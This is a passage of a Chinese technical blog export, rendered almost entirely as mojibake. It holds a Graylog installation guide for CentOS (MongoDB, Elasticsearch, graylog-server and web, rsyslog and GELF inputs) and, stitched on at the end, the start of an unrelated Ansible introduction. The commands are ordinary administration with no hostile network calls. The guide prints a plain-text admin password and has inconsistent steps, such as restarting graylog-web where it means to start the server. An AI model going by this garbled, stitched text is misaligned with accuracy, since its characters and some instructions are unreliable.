ä¸èƒ½ä¿ç•™åŸå§‹æ—¥å¿—ï¼Œåªèƒ½æŠŠåŸå§‹æ—¥å¿—åˆ†å­—æ®µä¿å­˜ï¼Œè¿™æ ·æœç´¢æ—¥å¿—ç»“æœæ˜¯ä¸€å †Jsonæ ¼å¼æ–‡æœ¬ï¼Œæ— æ³•é˜…è¯»ã€‚ ä¸å¤åˆæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„æ—¥å¿—è¡Œï¼Œè¢«å…¨éƒ¨ä¸¢å¼ƒã€‚ kibanaç»“åˆä½¿ç”¨ç»å¸¸ä¼šå‡ºç°å¡æ­»ã€‚èµ„æºæ¶ˆè€—éå¸¸å¤§ã€‚ æœ¬ç€è§£å†³ä»¥ä¸Š3ä¸ªç¼ºç‚¹çš„åŸåˆ™ï¼Œå†æ¬¡å¯»æ‰¾æ›¿ä»£æ–¹æ¡ˆã€‚ é¦–å…ˆæ‰¾åˆ°äº†å•†ä¸šæ—¥å¿—å·¥å…·Splunkï¼Œå·ç§°æ—¥å¿—ç•Œçš„Googleï¼Œæ„æ€æ˜¯å…¨æ–‡æœç´¢æ—¥å¿—çš„èƒ½åŠ›ï¼Œä¸å…‰èƒ½è§£å†³ä»¥ä¸Š3ä¸ªç¼ºç‚¹ï¼Œè¿˜æä¾›æœç´¢å•è¯é«˜äº®æ˜¾ç¤ºï¼Œä¸åŒé”™è¯¯çº§åˆ«æ—¥å¿—æ ‡è‰²ç­‰å¸å¼•äººçš„ç‰¹æ€§ï¼Œä½†æ˜¯å…è´¹ç‰ˆæœ‰500Mé™åˆ¶ï¼Œä»˜è´¹ç‰ˆæ®è¯´è¦3ä¸‡ç¾åˆ€ï¼Œåªèƒ½æ”¾å¼ƒï¼Œç»§ç»­å¯»æ‰¾ã€‚ æœ€åæ‰¾åˆ°äº†Graylogï¼Œç¬¬ä¸€çœ¼çœ‹åˆ°Graylogï¼Œåªæ˜¯ç³»ç»Ÿæ—¥å¿—syslogçš„é‡‡é›†å·¥å…·ï¼Œä¸€ç‚¹ä¹Ÿæ²¡å¸å¼•åˆ°æˆ‘ã€‚ä½†åæ¥æ·±å…¥äº†è§£åï¼Œæ‰å‘ç°Graylogç®€ç›´å°±æ˜¯å¼€æºç‰ˆçš„Splunkã€‚ æˆ‘è‡ªå·±æ€»ç»“çš„Graylogå¸å¼•äººçš„åœ°æ–¹ï¼š ä¸€ä½“åŒ–æ–¹æ¡ˆï¼Œå®‰è£…æ–¹ä¾¿ï¼Œä¸åƒELKæœ‰3ä¸ªç‹¬ç«‹ç³»ç»Ÿé—´çš„é›†æˆé—®é¢˜ã€‚ é‡‡é›†åŸå§‹æ—¥å¿—ï¼Œå¹¶å¯ä»¥äº‹åå†æ·»åŠ å­—æ®µï¼Œæ¯”å¦‚http_status_codeï¼Œresponse_timeç­‰ç­‰ã€‚ è‡ªå·±å¼€å‘é‡‡é›†æ—¥å¿—çš„è„šæœ¬ï¼Œå¹¶ç”¨curl/ncå‘é€åˆ°Graylog Serverï¼Œå‘é€æ ¼å¼æ˜¯è‡ªå®šä¹‰çš„GELFï¼ŒFluntedå’ŒLogstashéƒ½æœ‰ç›¸åº”çš„è¾“å‡ºGELFæ¶ˆæ¯çš„æ’ä»¶ã€‚è‡ªå·±å¼€å‘å¸¦æ¥å¾ˆå¤§çš„è‡ªç”±åº¦ã€‚å®é™…ä¸Šåªéœ€è¦ç”¨inotifywaitç›‘æ§æ—¥å¿—çš„modifyäº‹ä»¶ï¼Œå¹¶æŠŠæ—¥å¿—çš„æ–°å¢è¡Œç”¨curl/netcatå‘é€åˆ°Graylog Serverå°±å¯ã€‚ æœç´¢ç»“æœé«˜äº®æ˜¾ç¤ºï¼Œå°±åƒgoogleä¸€æ ·ã€‚ æœç´¢è¯­æ³•ç®€å•ï¼Œæ¯”å¦‚ï¼š source:mongo AND reponse_time_ms:&gt;5000ï¼Œé¿å…ç›´æ¥è¾“å…¥elasticsearchæœç´¢jsonè¯­æ³• æœç´¢æ¡ä»¶å¯ä»¥å¯¼å‡ºä¸ºelasticsearchçš„æœç´¢jsonæ–‡æœ¬ï¼Œæ–¹ä¾¿ç›´æ¥å¼€å‘è°ƒç”¨elasticsearch rest apiçš„æœç´¢è„šæœ¬ã€‚ Graylogå›¾è§£ Graylogå¼€æºç‰ˆå®˜ç½‘ï¼š https://www.graylog.org/ æ¥å‡ å¼ å®˜ç½‘çš„æˆªå›¾ï¼š Graylogæ˜¯å¼ºå¤§çš„æ—¥å¿—ç®¡ç†ã€åˆ†æå·¥å…·ã€‚å®ƒåŸºäº Elasticsearch, Javaå’ŒMongoDBã€‚ Graylogå¯ä»¥æ”¶é›†ç›‘æ§å¤šç§ä¸åŒåº”ç”¨çš„æ—¥å¿—ã€‚ä½†æ˜¯ä¸ºäº†ç¤ºèŒƒè¯´æ˜ï¼Œæˆ‘åªæ”¶é›†syslogã€‚å¹¶ä¸”ï¼Œæˆ‘å°†ä¼šæŠŠç”¨åˆ°çš„ç»„ä»¶å…¨éƒ¨å®‰è£…åˆ°ä¸€ä¸ªå•ç‹¬çš„æœåŠ¡å™¨ä¸Šã€‚å¯¹äºå¤§å‹ã€ç”Ÿäº§ç³»ç»Ÿä½ å¯ä»¥æŠŠç»„ä»¶åˆ†å¼€å®‰è£…åœ¨ä¸åŒçš„æœåŠ¡å™¨ä¸Šï¼Œè¿™æ ·å¯ä»¥æé«˜æ•ˆç‡ã€‚ Graylogçš„ç»„ä»¶Graylogæœ‰4ä¸ªåŸºæœ¬ç»„ä»¶ï¼š 1234Graylog Serverï¼šè¿™ä¸ªæœåŠ¡è´Ÿè´£æ¥æ”¶å’Œå¤„ç†æ—¥å¿—/æ¶ˆæ¯ï¼Œå¹¶ä¸”å’Œå…¶ä»–ç»„ä»¶æ²Ÿé€šã€‚Elasticsearchï¼šå­˜å‚¨æ‰€æœ‰çš„æ—¥å¿—ï¼Œå®ƒçš„æ€§èƒ½ä¾èµ–å†…å­˜å’Œç¡¬ç›˜IOã€‚MongoDBï¼šå­˜å‚¨å…ƒæ•°æ®ï¼Œè´Ÿè½½ä¸é«˜ã€‚graylog-Webæ¥å£ï¼šç”¨æˆ·æ¥å£ã€‚ ä¸‹é¢æ˜¯Graylogç»„ä»¶ä¹‹é—´çš„å…³ç³»å›¾ï¼š ä¸‹é¢æ¥è‡ªæˆ‘å…¬å¸å†…éƒ¨åˆ†äº«çš„PPTæ‹å›¾ï¼š ç”Ÿäº§ç¯å¢ƒ æˆ‘å‚è€ƒç½‘ä¸Šä¸€äº›åšå®¢ç”»çš„å›¾ï¼š ç³»ç»Ÿè¦æ±‚ï¼š CentOS 6.7 å†…å­˜è‡³å°‘2GB æœ‰rootæƒé™ æœåŠ¡å™¨ipæ˜¯192.168.1.234ï¼Œå·²å®‰è£… 1.8.0_77-b03 è¿™é‡Œæˆ‘åªæ˜¯ä¸¾ä¾‹å•ä¸€æ¨¡å¼è·‘æœåŠ¡ã€‚ å®‰è£…MongoDBMongoDBçš„å®‰è£…éå¸¸ç®€å•ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å¯¼å…¥MongoDB GPGå¯†é’¥åˆ°rpmï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142[root@graylog yum.repos.d]# vim /etc/yum.repos.d/mongodb-org-3.0.repo---[mongodb-org-3.0]name=MongoDB Repositorybaseurl=http://repo.mongodb.org/yum/redhat/$releasever/mongodb-org/3.0/x86_64/gpgcheck=0enabled=1---[root@graylog yum.repos.d]# yum install -y mongodb-org[root@graylog yum.repos.d]# vi /etc/yum.confæœ€åä¸€è¡Œæ·»åŠ ï¼š---exclude=mongodb-org,mongodb-org-server,mongodb-org-shell,mongodb-org-mongos,mongodb-org-tools---[root@graylog yum.repos.d]# service mongod start[root@graylog yum.repos.d]# chkconfig mongod on[root@graylog yum.repos.d]# vi /etc/security/limits.confæœ€åä¸€è¡Œæ·»åŠ ï¼š---* soft nproc 65536* hard nproc 65536mongod soft nproc 65536* soft nofile 131072* hard nofile 131072---[root@graylog ~]# vi /etc/init.d/mongodulimit -f unlimited è¡Œå‰æ’å…¥ï¼š--- if test -f /sys/kernel/mm/transparent_hugepage/enabled; then echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled fi if test -f /sys/kernel/mm/transparent_hugepage/defrag; then echo never &gt; /sys/kernel/mm/transparent_hugepage/defrag fi---[root@graylog ~]# /etc/init.d/mongod restart å®‰è£…ElasticsearchGraylogç›®å‰ä¸ºæ­¢åªèƒ½ä½¿ç”¨Elasticsearch 2.0ä»¥å‰çš„ç‰ˆæœ¬ï¼Œæ‰€ä»¥ï¼Œåœ¨è¿™ä¸€æ­¥ä¸­ï¼Œæˆ‘å°†å®‰è£…Elasticsearch 1.7.xã€‚ æ·»åŠ Elasticsearch GPGå¯†é’¥ï¼š $ sudo rpm --import http://packages.elastic.co/GPG-KEY-elasticsearch åˆ›å»ºElasticsearchæºï¼š $ sudo vim /etc/yum.repos.d/elasticsearch.repo å†™å…¥å¦‚ä¸‹å†…å®¹ï¼š 123456[elasticsearch-1.7]name=Elasticsearch repository for 1.7.x packagesbaseurl=http://packages.elastic.co/elasticsearch/1.7/centosgpgcheck=1gpgkey=http://packages.elastic.co/GPG-KEY-elasticsearchenabled=1 å®‰è£…Elasticsearchï¼š $ sudo yum -y install elasticsearch é…ç½®å‰å…ˆåˆ›å»ºå‡ ä¸ªç›®å½•æ–‡ä»¶ mkdir /data/es-data -p mkdir /data/es-work -p Elasticsearchå®‰è£…å®Œæˆä¹‹åï¼Œç¼–è¾‘é…ç½®æ–‡ä»¶ï¼š sudo vim /etc/elasticsearch/elasticsearch.yml node.data: true # æ•°æ®å­˜æ”¾true æ‰¾åˆ°cluster.nameä¸€è¡Œï¼Œå–æ¶ˆè¿™ä¸€è¡Œçš„æ³¨é‡Šï¼Œå¹¶æŠŠå€¼æ”¹ä¸ºgraylog-developmentï¼š cluster.name: graylog-development path.data: /data/es-data esæ•°æ®å­˜æ”¾ç›®å½• è¿™é‡Œéœ€è¦è‡ªå·±æ–°å»ºç›®å½• path.work: /data/es-work ä½ ä¹Ÿè®¸æƒ³è¦é™åˆ¶å¤–éƒ¨è®¿é—®Elasticsearchï¼ˆç«¯å£9200ï¼‰ï¼Œè¿™æ ·å¯ä»¥æé«˜ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚æ‰¾åˆ°network.hostä¸€è¡Œï¼Œå–æ¶ˆæ³¨é‡Šï¼Œå¹¶æŠŠå€¼æ”¹ä¸ºlocalhostï¼š network.host: 192.168.1.234 ä¿å­˜é€€å‡ºæ–‡ä»¶ã€‚ é‡å¯Elasticsearchï¼š $ service elasticsearch start è®¾ç½®å¼€æœºå¯åŠ¨ï¼š $ chkconfig --add elasticsearch æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤æµ‹è¯•Elasticsearchæ˜¯å¦æ­£å¸¸è¿è¡Œï¼š $ curl -XGET &apos;http://localhost:9200/_cluster/health?pretty=true&apos; è¾“å‡ºçš„ä¿¡æ¯å¦‚ä¸‹è¡¨ç¤ºElasticsearchå®‰è£…æˆåŠŸï¼š 1234567891011121314151617drwxr-xr-x. 2 root root 4096 9æœˆ 23 2011 src[root@ELK local]# curl -XGET 'http://192.168.1.234:9200/_cluster/health?pretty=true'&#123; \"cluster_name\" : \"graylog-development\", \"status\" : \"yellow\", \"timed_out\" : false, \"number_of_nodes\" : 1, \"number_of_data_nodes\" : 1, \"active_primary_shards\" : 37, \"active_shards\" : 37, \"relocating_shards\" : 0, \"initializing_shards\" : 0, \"unassigned_shards\" : 37, \"delayed_unassigned_shards\" : 0, \"number_of_pending_tasks\" : 0, \"number_of_in_flight_fetch\" : 0&#125; å®‰è£…Graylag Graylogçš„æœ€æ–°ç‰ˆæ˜¯1.1.4ï¼Œä¸‹è½½é“¾æ¥å¦‚ä¸‹ï¼šhttps://packages.graylog2.org/repo/el/6Server/1.1/x86_64/graylog-server-1.1.4-1.noarch.rpmhttps://packages.graylog2.org/repo/el/6Server/1.1/x86_64/graylog-web-1.1.4-1.noarch.rpm ç°åœ¨Graylogçš„æ‰€æœ‰ä¾èµ–è½¯ä»¶å®‰è£…å®Œæˆï¼Œè¿™ä¸€æ­¥æˆ‘ä»¬æ¥å®‰è£…graylog-serverã€‚ é¦–å…ˆï¼Œä¸‹è½½Graylog RPMè½¯ä»¶åŒ…ï¼š $ cd $ sudo rpm -Uvh https://packages.graylog2.org/repo/packages/graylog-1.3-repository-el7_latest.rpm å®‰è£…graylog-serverï¼š yum -y install graylog-server å®‰è£…pwgenï¼Œæˆ‘ä»¬ä½¿ç”¨å®ƒç”Ÿæˆéšæœºå¯†ç ï¼š yum -y install epel-release yum -y install pwgen ç°åœ¨æˆ‘ä»¬æ¥è®¾ç½®Graylogç®¡ç†å‘˜çš„å¯†é’¥ã€‚é…ç½®æ–‡ä»¶ä½äº/etc/graylog/server/server.confç›®å½•ï¼Œéœ€è¦ä¿®æ”¹password_secretå‚æ•°ï¼š $ SECRET=$(pwgen -s 96 1) $ sudo -E sed -i -e &apos;s/password_secret =.*/password_secret = &apos;$SECRET&apos;/&apos; /etc/graylog/server/server.conf æ‰§è¡Œå®Œä¸Šé¢å‘½ä»¤ä¹‹åï¼Œpassword_secretå‚æ•°çš„æ ·å­ï¼š è¿™ä¸€æ­¥ï¼Œè®¾ç½®ç®¡ç†å‘˜å¯†ç ã€‚ç”±äºå¯†ç ä½¿ç”¨shaå“ˆå¸Œç®—æ³•ï¼Œæˆ‘ä»¬éœ€è¦æŠŠæ˜æ–‡å¯†ç è½¬æ¢ä¸ºhashï¼Œç„¶åèµ‹å€¼ç»™root_password_sha2å‚æ•°ã€‚ä¾‹å¦‚ï¼Œæˆ‘è¦è®¾ç½®çš„ç®¡ç†å‘˜å¯†ç æ˜¯ Ihaozhuo_b313ï¼Œå®ƒå¯¹åº”çš„hashä¸ºï¼š $ echo -n Ihaozhuo_b313 | sha256sum | awk &apos;{print $1}&apos; ç¼–è¾‘/etc/graylog/server/server.confï¼Œè®¾ç½®root_password_sha2å‚æ•°ï¼š $ sudo vim /etc/graylog/server/server.conf ç°åœ¨Graylogç®¡ç†å‘˜å¯†ç ä¸ºIhaozhuo_b313ã€‚ é…ç½®rest_transport_uriå‚æ•°ï¼Œè®¾ç½®Graylog webæ¥å£å’ŒæœåŠ¡å™¨çš„æ²Ÿé€šæ–¹å¼ã€‚ç”±äºæˆ‘ä»¬æŠŠæ‰€æœ‰ç»„ä»¶éƒ½å®‰è£…åˆ°äº†å•ç‹¬çš„ä¸€ä¸ªæœåŠ¡å™¨ä¸Šï¼Œéœ€è¦æŠŠå€¼è®¾ç½®ä¸º127.0.0.1 æˆ– localhostã€‚æ‰¾åˆ°rest_transport_uriä¸€è¡Œï¼Œå–æ¶ˆæ³¨é‡Šï¼Œå¹¶æŠŠå€¼è®¾ç½®ä¸ºï¼š rest_transport_uri = http://192.168.1.234:12900/ ç”±äºæˆ‘ä»¬åªæœ‰ä¸€ä¸ªElasticsearch shardï¼Œéœ€è¦æŠŠelasticsearch_shardså‚æ•°è®¾ç½®ä¸º1ï¼š elasticsearch_shards = 1 æ›´æ”¹elasticsearch_cluster_nameå‚æ•°ï¼Œåº”è¯¥å’Œå‰é¢Elasticsearchçš„cluster.nameå‚æ•°ç›¸å¯¹åº”ï¼š elasticsearch_cluster_name = graylog-development å–æ¶ˆä¸‹é¢ä¸¤è¡Œçš„æ³¨é‡Šï¼Œæ£€æµ‹Elasticsearchï¼š 172 elasticsearch_discovery_zen_ping_multicast_enabled = false 173 elasticsearch_discovery_zen_ping_unicast_hosts = 192.168.1.234:9300 å¯åŠ¨graylog-serverï¼š /etc/init.d/graylog-web restart å®‰è£…Graylog Webå®‰è£…Graylog Webï¼š $ sudo yum -y install graylog-web å®‰è£…å®Œæˆä¹‹åé…ç½®Graylog Webçš„å¯†é’¥ï¼Œé…ç½®æ–‡ä»¶ä½äº/etc/graylog/web/web.confï¼Œæ›´æ”¹application.secretå‚æ•°ï¼š $ SECRET=$(pwgen -s 96 1) $ sudo -E sed -i -e &apos;s/application\\.secret=&quot;&quot;/application\\.secret=&quot;&apos;$SECRET&apos;&quot;/&apos; /etc/graylog/web/web.conf é…ç½®graylog2-server.uriså‚æ•°ï¼Œå®ƒçš„å€¼åº”è¯¥å’ŒGraylogçš„rest_listen_uriå‚æ•°ç›¸å¯¹åº”ï¼š $ sudo vim /etc/graylog/web/web.conf graylog2-server.uris=&quot;http://127.0.0.1:12900/&quot; é‡å¯graylog-webï¼š /etc/init.d/graylog-web restart é…ç½®GraylogæœåŠ¡å™¨æ¥æ”¶å…¶ä»–æœåŠ¡å™¨çš„syslogæ—¥å¿—ç™»å½•Graylog Webä½¿ç”¨æµè§ˆå™¨è®¿é—®GraylogæœåŠ¡å™¨çš„åŸŸåæˆ–IPï¼šhttp://graylog_public_IP_domain:9000/ã€‚ ä½ åº”è¯¥èƒ½çœ‹åˆ°ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œä½¿ç”¨adminåšä¸ºç”¨æˆ·åå’Œå‰é¢è®¾ç½®çš„å¯†ç ç™»å½•ã€‚ ç™»å½•ä¹‹åï¼š ä¸Šé¢çš„çº¢æ•°å­—1æ˜¯é€šçŸ¥ï¼ˆyou have a node without any running inputsï¼‰ï¼Œä¸‹é¢è®¾ç½®é€šè¿‡UDPæ¥æ”¶syslogã€‚ åˆ›å»ºsyslog UDPè¾“å…¥ æ·»åŠ è¦æ¥æ”¶çš„å…¶ä»–æœåŠ¡å™¨syslogæ—¥å¿—ï¼šSystem-&gt;Inputs-&gt;Syslog UDP-&gt;Launch new inputã€‚ åœ¨å¼¹å‡ºçš„çª—å£ä¸Šè¾“å…¥å¦‚ä¸‹ä¿¡æ¯ï¼š Title: syslog Port: 8514 Bind address: è¿™é‡Œå†™Graylog-serveræœåŠ¡å™¨ä¸»æœºIP ç‚¹å‡»Launch å¦‚æœä½ éœ€è¦æ”¶é›†å¤šä¸ªæœåŠ¡å™¨çš„æ—¥å¿—ï¼Œé‡å¤ä¸Šé¢æ­¥éª¤ã€‚ ç°åœ¨ï¼Œæˆ‘ä»¬çš„GraylogæœåŠ¡å™¨å·²ç»åšå¥½äº†æ¥æ”¶å…¶ä»–æœåŠ¡å™¨å‘æ¥æ—¥å¿—çš„å‡†å¤‡ã€‚ä¸‹é¢æˆ‘ä»¬è¿˜éœ€è¦é…ç½®å…¶ä»–æœåŠ¡å™¨ï¼Œè®©è¿™äº›æœåŠ¡å™¨ç»™GraylogæœåŠ¡å™¨å‘é€æ—¥å¿—ã€‚ é…ç½®å…¶ä»–æœåŠ¡å™¨ç»™GraylogæœåŠ¡å™¨å‘é€syslogå‚è€ƒå®˜ç½‘ï¼šä»Linuxç³»ç»Ÿæ—¥å¿—å‘é€åˆ°Graylog SSHç™»å½•â€œå…¶ä»–æœåŠ¡å™¨â€ï¼Œåˆ›å»ºrsyslogé…ç½®æ–‡ä»¶90-graylog.confï¼š sudo vim /etc/rsyslog.d/90-graylog.conf æ·»åŠ å¦‚ä¸‹ä»£ç ï¼ŒæŠŠ graylog_server_IP æ›¿æ¢ä¸ºGraylogæœåŠ¡å™¨ipåœ°å€ï¼š $template GRAYLOGRFC5424,&quot;&lt;%pri%&gt;%protocol-version% %timestamp:::date-rfc3339% %HOSTNAME% %app-name% %procid% %msg%\\n&quot; *.* @graylog_server_IP:8514;GRAYLOGRFC5424 é‡å¯rsyslogæœåŠ¡ä½¿ç”Ÿæ•ˆï¼š /etc/init.d/rsyslog restart é…ç½®å®Œæˆä¹‹åï¼Œå›åˆ°Graylog Webï¼Œç‚¹å‡»Sourcesï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰æ–°æ·»åŠ rsyslogã€‚ Graylogä½¿ç”¨httpåè®®å‘é€ï¼šæ·»åŠ è¦æ¥æ”¶çš„å…¶ä»–æœåŠ¡å™¨syslogæ—¥å¿—ï¼šSystem-&gt;Inputs-&gt;GELF HTTP-&gt;Launch new inputã€‚ ç„¶ååœ¨æœåŠ¡å™¨ä¸Šé¢å‘é€ä¸‹é¢å‘½ä»¤ã€‚ 12[root@graylog-development ~]# curl -XPOST http://192.168.1.234:12201/gelf -p0 -d '&#123;\"short_message\":\"Hello there\", \"host\":\"example.org\", \"facility\":\"test\", \"_foo\":\"bar\"&#125;'[root@graylog-development ~]# curl -XPOST http://192.168.1.234:12201/gelf -p0 -d '&#123;\"short_message\":\"æµ‹è¯•\", \"host\":\"example.org\", \"facility\":\"test\", \"_foo\":\"bar\"&#125;' è¿™é‡Œå®šä¹‰192.168.1.234 æ˜¯graylog-serveræœåŠ¡å™¨åœ°å€ 12201 ç«¯å£æ˜¯ä¹‹å‰åˆ›å»ºå¥½çš„ã€‚ æœç´ Graylogå‡å¦‚ä½ è¦æœç´¢helloï¼š ä¸Šé¢å®‰è£…é…ç½®äº†åŸºæœ¬çš„GraylogæœåŠ¡å™¨ã€‚ æ—¶åŒºå’Œé«˜äº®è®¾ç½®adminå¸å·çš„æ—¶åŒºï¼š 12345[root@graylog ~]# vi /etc/graylog/server/server.conf---30 root_timezone = Asia/Shanghai---[root@graylog ~]# /etc/init.d/graylog-server restart å…¶ä»–å¸å·çš„é»˜è®¤æ—¶åŒºï¼š 12345[root@graylog ~]# vi /etc/graylog/web/web.conf---18 timezone=\"Asia/Shanghai\"---[root@graylog ~]# /etc/init.d/graylog-web restart å…è®¸æŸ¥è¯¢ç»“æœé«˜äº®ï¼š 12345[root@graylog ~]# vi /etc/graylog/server/server.conf---147 allow_highlighting = true---[root@graylog ~]# /etc/init.d/graylog-server restart ç§»åŠ¨æ•°æ®ç›®å½•123456789101112131415161718ç§»åŠ¨elasticsearchçš„æ•°æ®ç›®å½•[root@graylog ~]# sudo /etc/init.d/elasticsearch stop[root@graylog ~]# sudo cp -rp /var/lib/elasticsearch/ /data/[root@graylog ~]# sudo vi /etc/sysconfig/elasticsearch+16 DATA_DIR=/data/elasticsearch[root@graylog ~]# sudo /etc/init.d/elasticsearch startç§»åŠ¨mongoçš„æ•°æ®ç›®å½•[root@graylog ~]# sudo /etc/init.d/mongod stop[root@graylog ~]# sudo cp -rp /var/lib/mongo /data/[root@graylog ~]# sudo vi /etc/mongod.conf---13 dbpath=/var/lib/mongo-&gt;13 dbpath=/data/mongo---[mtagent@access2 ~]$ sudo /etc/init.d/mongod start å…¶ä½™å‚è€ƒæ–‡æ¡£å‚è€ƒå®˜ç½‘ Centos7 æ­å»ºgraylog Graylogâ€”â€”æ—¥å¿—èšåˆå·¥å…·ä¸­çš„åèµ·ä¹‹ç§€","link":"/2016/11/13/æ—¥å¿—åˆ†æ\u0010å¹³å°/Graylog/Graylogâ€”æ—¥å¿—åˆ†æå¹³å°å®Œç¾ä»£æ›¿Elasticsearch/"},{"title":"Ansible å­¦ä¹ å…¥é—¨","text":"Ansibleä»‹ç» å­¦ä¹ ansibleè¿™é‡Œæˆ‘è‡ªå·±åšäº†ç®€å•çš„ä»‹ç»æ€»ç»“ï¼š Ansibleæ˜¯ä¸€ä¸ªè‡ªåŠ¨åŒ–å·¥å…·ã€‚å®ƒå¯ä»¥é…ç½®ç³»ç»Ÿ,éƒ¨ç½²è½¯ä»¶,ç¼–æ’æ›´é«˜çº§çš„ä»»åŠ¡,æ¯”å¦‚è¿ç»­éƒ¨ç½²æˆ–é›¶åœæœºæ—¶é—´æ»šåŠ¨æ›´æ–°ã€‚ Ansibleçš„ç›®æ ‡æ˜¯æœ€ç®€å•å’Œæœ€æ˜“ç”¨ã€‚å®ƒä¹Ÿæœ‰ä¸€ä¸ªå¼ºçƒˆå…³æ³¨å®‰å…¨æ€§å’Œå¯é æ€§,ä»¥æœ€å°‘çš„ç§»åŠ¨éƒ¨ä»¶,ä½¿ç”¨OpenSSHè¿è¾“(åŠ é€Ÿæ’åº§æ¨¡å¼å’Œæ‹‰æ¨¡å¼é€‰æ‹©),å’Œè®¾è®¡è¯­è¨€,äººç±»å¯å®¡æ ¸æ€§çš„â€”â€”ç”šè‡³æ˜¯é‚£äº›ä¸ç†Ÿæ‚‰ç¨‹åºã€‚ æˆ‘ä»¬è®¤ä¸ºç®€å•æ˜¯æ‰€æœ‰å¤§å°çš„ç¯å¢ƒå’Œç›¸å…³çš„è®¾è®¡å¯¹äºå¿™ç¢Œçš„æ‰€æœ‰ç±»å‹çš„ç”¨æˆ·â€”â€”è¿™æ˜¯å¦æ„å‘³ç€å¼€å‘äººå‘˜ã€ç³»ç»Ÿç®¡ç†å‘˜,å‘å¸ƒå·¥ç¨‹å¸ˆ,ç»ç†,æ— å¤„ä¸åœ¨ã€‚Ansibleé€‚åˆç®¡ç†å°è®¾ç½®å°‘é‡çš„å®ä¾‹ä»¥åŠä¸è®¸å¤šæˆåƒä¸Šä¸‡çš„ä¼ä¸šç¯å¢ƒã€‚ Ansibleç®¡ç†æœºå™¨ä»¥æœ€å¥½çš„æ–¹å¼ã€‚æ²¡æœ‰ä¸€ä¸ªé—®é¢˜å¦‚ä½•å‡çº§è¿œç¨‹å®ˆæŠ¤è¿›ç¨‹æˆ–æ— æ³•ç®¡ç†ç³»ç»Ÿçš„é—®é¢˜å› ä¸ºå®ˆæŠ¤è¿›ç¨‹æ˜¯å¸è½½ã€‚OpenSSHæ˜¯æœ€åŒè¡Œè¯„è®®çš„å¼€æºç»„ä»¶,ä½¿ç”¨è¯¥å·¥å…·çš„å®‰å…¨é£é™©å¤§å¤§é™ä½ã€‚Ansibleæ˜¯åˆ†æ•£çš„,å®ƒä¾èµ–äºç°æœ‰çš„æ“ä½œç³»ç»Ÿå‡­è¯æ¥æ§åˆ¶è®¿é—®è¿œç¨‹æœºå™¨,å¦‚æœéœ€è¦ä½¿ç”¨Kerberos,å®ƒå¯ä»¥å¾ˆå®¹æ˜“åœ°è¿æ¥LDAPå’Œå…¶ä»–ç®¡ç†ç³»ç»Ÿçš„é›†ä¸­å¼èº«ä»½éªŒè¯ã€‚ Ansibleæ˜¯ä¸€ä¸ªå½»åº•çš„ç®€å•è‡ªåŠ¨åŒ–å¼•æ“,è‡ªåŠ¨åŒ–äº‘é…ç½®,é…ç½®ç®¡ç†ã€åº”ç”¨ç¨‹åºéƒ¨ç½²,intra-serviceç¼–æ’,ä»¥åŠè®¸å¤šå…¶ä»–çš„éœ€æ±‚ã€‚ è¢«è®¾è®¡ä¸ºå¤šå±‚éƒ¨ç½²è‡ªç¬¬ä¸€å¤©,Ansibleæ¨¡å‹ä½ çš„ITåŸºç¡€è®¾æ–½,æè¿°å¦‚ä½•æ¨åŠ¨ä½ æ‰€æœ‰çš„ç³»ç»Ÿ,è€Œä¸ä»…ä»…æ˜¯ç®¡ç†ä¸€ä¸ªç³»ç»Ÿã€‚ å®ƒä½¿ç”¨æ²¡æœ‰ä»£ç†,æ²¡æœ‰é¢å¤–çš„è‡ªå®šä¹‰å®‰å…¨åŸºç¡€è®¾æ–½,æ‰€ä»¥å¾ˆå®¹æ˜“éƒ¨ç½²,æœ€é‡è¦çš„æ˜¯,å®ƒä½¿ç”¨ä¸€ä¸ªéå¸¸ç®€å•çš„è¯­è¨€(YAML Ansible Playbooksçš„å½¢å¼),è®©ä½ æè¿°ä½ çš„è‡ªåŠ¨åŒ–å·¥ä½œçš„æ–¹å¼æ–¹æ³•ç®€æ˜è‹±è¯­ã€‚ æˆ‘ä»¬åˆ©ç”¨Ansibleä¸»è¦æ˜¯ä½œä¸ºå†…ç½‘æœåŠ¡å™¨çš„ä¸€äº›ç®¡ç†ï¼Œå› ä¸ºä»–ç”¨sshæ¥ç®¡ç†é…ç½®ï¼Œå†…ç½‘åŒå­¦è¿˜æ˜¯å¾ˆå¿«é€Ÿçš„ï¼Œå¤–ç½‘ä¸»è¦æ˜¯åˆ©ç”¨Saltstackï¼Œåˆ©ç”¨æ¶ˆæ¯é˜Ÿåˆ—è¿œç¨‹é€šä¿¡ï¼Œæˆ‘æ„Ÿè§‰æ˜¯æ¯”Ansibleå¥½çš„ã€‚ ä¸ºä»€ä¹ˆé€‰æ‹©ansible Ansibleå¤§å®¶éƒ½çŸ¥é“ï¼Œå’Œsalt/puppetç­‰ä¸€æ ·ï¼Œæ˜¯ä¸€æ¬¾é…ç½®ç®¡ç†å·¥å…·ã€‚ä¸ºä»€ä¹ˆé€‰æ‹©å®ƒï¼Œå°±æ˜¯å› ä¸ºå®ƒç®€å•ï¼Œä¸éœ€è¦å®‰è£…agentï¼Œåªè¦æœåŠ¡å™¨èƒ½ç”¨sshè®¿é—®ï¼Œå°±å¯ä»¥ä½¿ç”¨å®ƒå»ç®¡ç†å¤§å®¶å¦‚æœè¦é—®ï¼Œå’Œæˆ‘ç”¨rsyncç›´æ¥åŒæ­¥æˆ–å†™ä¸ªforå¾ªç¯æ‰§è¡Œrpmæˆ–yumæœ‰ä»€ä¹ˆåŒºåˆ«. æˆ‘æƒ³æœ€å¤§çš„åŒºåˆ«åº”è¯¥å°±æ˜¯â€œå¹¶å‘â€å½“ç„¶ï¼Œå¤§ä¼ä¸šä¼šè‡ªå·±å»å¼€å‘è‡ªå·±çš„æŒç»­éƒ¨ç½²å¹³å°ï¼Œè€Œå¤§éƒ¨åˆ†çš„è¿˜æ˜¯ä¸­å°å‹ä¼ä¸š å…¶å®éƒ¨ç½²æ¯ä¸ªç¯èŠ‚éƒ½å¯ä»¥ç”¨rpmå®‰è£…å‘å¸ƒã€‚ 